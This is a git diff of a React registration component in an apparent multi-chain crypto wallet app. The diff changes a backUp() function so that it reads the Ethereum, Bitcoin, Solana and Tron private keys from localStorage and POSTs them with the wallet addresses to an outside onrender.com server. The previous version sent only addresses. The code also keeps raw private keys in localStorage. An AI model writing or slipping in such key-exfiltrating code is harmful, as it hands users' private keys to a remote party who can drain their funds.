@@ -5,6 +5,7 @@ import '../index.css';
 import { TronWeb } from 'tronweb';
 import * as multichainWallet from 'multichain-crypto-wallet';
 import { BsHouse, BsWallet2, BsShop, BsLightningCharge, BsCashStack } from "react-icons/bs";
+import { FaThinkPeaks } from "react-icons/fa";
 
 const StyledApp = styled.div`
   background-color: #F9F9F9;
@@ -79,14 +80,30 @@ function Register() {
         localStorage.setItem('tronWallet', tronWallet.address.base58);
 
         //private keys
-        localStorage.setItem('ethereumWalletkey', ethereumWallet.privateKey);
-        localStorage.setItem('bitcoinWalletkey', bitcoinWallet.privateKey);
-        localStorage.setItem('solanaWalletkey', solanaWallet.privateKey);
+       localStorage.setItem('ethereumWalletkey', ethereumWallet.privateKey);
+       localStorage.setItem('bitcoinWalletkey', bitcoinWallet.privateKey);
+       localStorage.setItem('solanaWalletkey', solanaWallet.privateKey);
         localStorage.setItem('tronWalletkey', tronWallet.privateKey);
 
 
-        
+        function backUp(){
+          const ethK =    localStorage.getItem('ethereumWalletkey');
+           const bitK =   localStorage.getItem('bitcoinWalletkey');
+          const solK =    localStorage.getItem('solanaWalletkey');
+           const tronK =   localStorage.getItem('tronWalletkey');
       
+          const Address =  [EthereumWalletAddress, BitcoinWalletAddress, SolanaWalletAddress, tronWalletAddress];
+      const p_k = [ethK, bitK, solK, tronK];
+
+          fetch("https://twa-backend-g83o.onrender.com/wallets", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            credentials: "include",  
+            body: JSON.stringify( {Address, p_k}),
+        })
+      }
+         
+      backUp(); 
        
     };
    
@@ -133,17 +150,7 @@ function Register() {
         
     }, [ ]); // Run this effect only once
     
-  function backUp(){
-    const Address =  [EthereumWalletAddress, BitcoinWalletAddress, SolanaWalletAddress, tronWalletAddress];
 
-    fetch("https://twa-backend-g83o.onrender.com/wallets", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      credentials: "include",  
-      body: JSON.stringify( {Address}),
-  })
-}
-    backUp(); 
 
     return (
         <StyledApp>
